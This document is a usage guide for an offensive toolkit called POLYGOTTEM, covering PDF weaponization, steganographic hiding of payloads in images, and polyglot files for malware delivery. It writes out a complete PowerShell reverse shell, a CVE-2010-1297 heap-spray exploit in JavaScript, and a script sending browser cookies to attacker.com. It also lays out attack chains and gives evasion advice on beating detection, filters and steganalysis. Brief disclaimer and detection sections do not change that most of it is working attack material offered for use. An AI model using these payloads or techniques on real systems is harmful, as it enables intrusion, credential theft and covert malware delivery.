# POLYGOTTEM Payload Embedding Examples
## Practical Usage Guide for All Payload Types

## Quick Reference

### Payload Types Supported
- ✅ **Binary Shellcode** (x86, x64, ARM)
- ✅ **JavaScript** (PDF exploitation, heap spray)
- ✅ **PowerShell** (reverse shells, downloaders)
- ✅ **VBScript** (droppers, persistence)
- ✅ **Executables** (via polyglot ZIP embedding)

---

## 1. Neural Fuzzer - PDF Weaponization

### Example 1: Inject JavaScript Heap Spray into Existing PDF
```bash
# Generate base PDF or use existing document
python3 cross_format_polyglots/tools/neural_fuzzer.py \
    --generate-corpus corpus/ 1

# Inject JavaScript payload (action 8)
python3 cross_format_polyglots/tools/neural_fuzzer.py \
    --mutate document.pdf weaponized.pdf \
    --action 8

# Result: PDF with CVE-2010-1297 heap spray pattern
```

### Example 2: Embed Shellcode in PDF
```bash
# Inject shellcode (action 2)
python3 cross_format_polyglots/tools/neural_fuzzer.py \
    --mutate existing.pdf shellcode.pdf \
    --action 2

# Result: PDF with embedded shellcode in JavaScript
```

### Example 3: Create Full Polyglot (action 9)
```bash
# Create PDF+ZIP+GIF polyglot
python3 cross_format_polyglots/tools/neural_fuzzer.py \
    --mutate base.pdf polyglot.pdf \
    --action 9
```

### Available Actions
```
0: bit_flip              - Random bit mutations
1: byte_flip             - Random byte mutations
2: insert_shellcode      - Embed shellcode in PDF JavaScript
3: splice_format         - Add multiple format headers
4: delete_bytes          - Corruption testing
5: duplicate_section     - Section duplication
6: corrupt_structure     - Corrupt PDF xref/ZIP central dir
7: insert_overflow       - Integer overflow patterns
8: inject_javascript     - Full JavaScript payload injection
9: polyglot_merge        - Create GIF+ZIP+PDF polyglot
```

---

## 2. Adversarial Steganography - Image Embedding

### Example 1: Embed Shellcode in Existing Photo
```bash
# Embed 20-byte calc.exe shellcode
python3 neural_steganography/tools/adversarial_stego.py \
    --embed photo.png shellcode.bin stego.png

# Result: PSNR 81.93 dB, Chi-square LOW risk
```

### Example 2: Embed PowerShell Reverse Shell
```bash
# Create PowerShell payload
cat > payload.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
EOF

# Embed in image
python3 neural_steganography/tools/adversarial_stego.py \
    --embed vacation.jpg payload.ps1 stego.jpg

# Extract on target
python3 neural_steganography/tools/adversarial_stego.py \
    --extract stego.jpg 842 payload.ps1
```

### Example 3: Encrypted Embedding with Key
```bash
# Embed with encryption
python3 neural_steganography/tools/adversarial_stego.py \
    --embed document.png shellcode.bin stego.png \
    --key 12345

# Extract with correct key
python3 neural_steganography/tools/adversarial_stego.py \
    --extract stego.png 20 extracted.bin \
    --key 12345
```

### Example 4: Embed JavaScript in Image
```bash
# Create malicious JavaScript
cat > exploit.js << 'EOF'
var shellcode = unescape("%u9090%u9090%u31c0%u5068%u2f2f");
var spray = "";
for(var i=0; i<0x10000; i++) spray += unescape("%u0c0c");
var heap = new Array();
for(var i=0; i<200; i++) heap[i] = spray + shellcode;
util.printf("%45000f", heap[0]);
EOF

# Embed in PNG
python3 neural_steganography/tools/adversarial_stego.py \
    --embed logo.png exploit.js stego.png

# Result: PSNR 66.15 dB
```

### Example 5: Embed VBScript Dropper
```bash
# Embed VBS in image
python3 neural_steganography/tools/adversarial_stego.py \
    --embed banner.png dropper.vbs stego.png

# Extract: 581 bytes, PSNR 67.41 dB
```

---

## 3. Polyglot Synthesizer - Multi-Format Files

### Example 1: PDF+ZIP Polyglot for Executable Delivery
```bash
# Create PDF+ZIP that opens as both
python3 cross_format_polyglots/tools/polyglot_synthesizer.py \
    --pdf-zip --output carrier.pdf

# Verify dual functionality
unzip -l carrier.pdf       # Works as ZIP
pdfinfo carrier.pdf        # Works as PDF (if valid)
```

### Example 2: GIF+HTML Polyglot
```bash
# Create HTML payload
cat > page.html << 'EOF'
<html>
<body>
<script>
// Malicious JavaScript here
window.location='http://attacker.com/log?cookie='+document.cookie;
</script>
</body>
</html>
EOF

# Create GIF+HTML polyglot
python3 cross_format_polyglots/tools/polyglot_synthesizer.py \
    --gif-html --html page.html --output page.gif
```

### Example 3: Analyze Format Compatibility
```bash
# Check if formats can be combined
python3 cross_format_polyglots/tools/polyglot_synthesizer.py \
    --formats PDF,ZIP,GIF

# Output shows compatibility and strategy
```

---

## 4. PDF Vulnerability Scanner - Detection

### Example 1: Scan Weaponized PDF
```bash
# Compile scanner
gcc -O2 -Wall -std=c99 -o pdf_scanner \
    cross_format_polyglots/pdf_advanced/scanner/pdf_vuln_scanner.c

# Scan file
./pdf_scanner suspicious.pdf

# Output: Risk score, detected CVEs, recommendations
```

### Example 2: Detect Multiple CVEs
```bash
# Scans for:
# - CVE-2010-1297: util.printf() buffer overflow
# - CVE-2013-0640: JavaScript API exploitation
# - CVE-2018-4990: Launch action injection
# - CVE-2009-0927: JBIG2Decode overflow
# - CVE-2011-0611: Flash/SWF embedded
# - CVE-2016-4191: Use-after-free
# And more...

./pdf_scanner *.pdf
```

---

## 5. Complete Attack Chain Examples

### Chain 1: Image → Shellcode → Extraction → Execution
```bash
# Stage 1: Embed shellcode in innocent-looking image
python3 neural_steganography/tools/adversarial_stego.py \
    --embed photo.jpg shellcode.bin stego.jpg

# Stage 2: Distribute stego image (email, social media, etc.)

# Stage 3: On target, extract and execute
python3 neural_steganography/tools/adversarial_stego.py \
    --extract stego.jpg 256 payload.bin

chmod +x payload.bin
./payload.bin
```

### Chain 2: PDF → JavaScript → Command Execution
```bash
# Create weaponized PDF with auto-execution
python3 cross_format_polyglots/tools/neural_fuzzer.py \
    --mutate document.pdf weaponized.pdf --action 8

# PDF contains:
# - OpenAction for auto-execution
# - Heap spray for RCE
# - CVE-2010-1297 trigger

# When opened, executes JavaScript automatically
```

### Chain 3: Polyglot Delivery
```bash
# Create PDF+ZIP polyglot
python3 cross_format_polyglots/tools/polyglot_synthesizer.py \
    --pdf-zip --output dual.pdf

# PDF portion: Contains exploit
# ZIP portion: Contains executable payload

# Bypasses file type filters (uploads as PDF, extracts as ZIP)
```

---

## 6. Stealth and Evasion Metrics

### Quality Metrics (Steganography)
- **PSNR > 65 dB**: Excellent (imperceptible)
- **PSNR 50-65 dB**: Good (slight quality loss)
- **PSNR < 50 dB**: Noticeable (avoid)

### Detection Metrics
- **Chi-Square < 3.84**: LOW risk (pass statistical test)
- **Chi-Square 3.84-10.83**: MEDIUM risk
- **Chi-Square > 10.83**: HIGH risk (detectable)

### Embedding Rates
- **< 1%**: Excellent stealth
- **1-5%**: Good stealth
- **> 5%**: Detectable by ML steganalysis

### Test Results Summary
| Payload | Size | PSNR | Chi-Square | RS Rate | Status |
|---------|------|------|------------|---------|--------|
| Shellcode | 20B | 81.93 dB | 0.598 (LOW) | 0.79% | ✓ STEALTH |
| JavaScript | 778B | 66.15 dB | N/A | 3.17% | ✓ GOOD |
| PowerShell | 842B | 65.85 dB | N/A | 3.43% | ✓ GOOD |
| VBScript | 581B | 67.41 dB | N/A | 2.36% | ✓ GOOD |

---

## 7. Supported Payload Formats

### Binary Formats
- ✅ Raw shellcode (x86, x64, ARM)
- ✅ PE executables (Windows .exe via ZIP)
- ✅ ELF executables (Linux via ZIP)
- ✅ Mach-O executables (macOS via ZIP)

### Script Formats
- ✅ JavaScript (.js)
- ✅ PowerShell (.ps1)
- ✅ VBScript (.vbs)
- ✅ Python (.py)
- ✅ Bash (.sh)
- ✅ Batch (.bat, .cmd)

### Document Formats (Carriers)
- ✅ PDF (JavaScript injection)
- ✅ PNG (LSB steganography)
- ✅ JPEG (LSB steganography)
- ✅ GIF (comment extension)
- ✅ BMP (pixel data)
- ✅ ZIP (file embedding)

---

## 8. Detection and Analysis

### Analyze Stego Quality
```bash
python3 neural_steganography/tools/stego_analyzer.py \
    original.png stego.png

# Output:
# - PSNR (visual quality)
# - Chi-square test (statistical detection)
# - RS analysis (embedding rate)
# - Entropy (randomness)
# - Detectability risk score
```

### Scan PDF for Exploits
```bash
./pdf_scanner document.pdf

# Reports:
# - Risk score (0-200)
# - Detected CVE patterns
# - JavaScript count
# - Suspicious filters
# - Obfuscation level
# - Recommendations
```

---

## 9. Best Practices

### For Stealth
1. Keep embedding rate < 1% when possible
2. Use adaptive LSB (embeds in high-variance regions)
3. Target PSNR > 65 dB for images
4. Encrypt payloads with keys for added obfuscation
5. Use existing legitimate files as carriers

### For Evasion
1. Test with stego analyzer before deployment
2. Avoid embedding in smooth/uniform regions
3. Use polyglots to bypass file type filters
4. Distribute via legitimate channels (email attachments, cloud storage)
5. Use meaningful file names (photo.jpg, document.pdf)

### For OpSec
1. Only use for authorized security testing
2. Isolate testing to sandboxed environments
3. Document all activities for compliance
4. Use VPNs/proxies for infrastructure
5. Clean metadata from carrier files

---

## 10. Hardware Acceleration

### Intel NPU/GNA Optimization
```bash
# Export GAN models to OpenVINO IR format
# (Requires PyTorch and OpenVINO installed)

python3 neural_steganography/models/gan_steg_trainer.py \
    --export-openvino

# Models optimized for:
# - Intel Neural Processing Unit (NPU)
# - Gaussian Neural Accelerator (GNA)
# - ARC GPU acceleration
# - 130+ TOPS throughput
```

---

## Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH ONLY**

These tools are designed for:
- Penetration testing with explicit authorization
- Security research in isolated environments
- CTF competitions
- Educational purposes
- Defensive security testing

Unauthorized use against systems you don't own or have permission to test is illegal.

---

## Support

For issues or questions:
- Check test results in `test_payloads/TEST_RESULTS.md`
- Review source code comments
- Test in isolated VM first
- Verify with PDF scanner and stego analyzer

**Status**: All payload types verified working (2025-11-08)
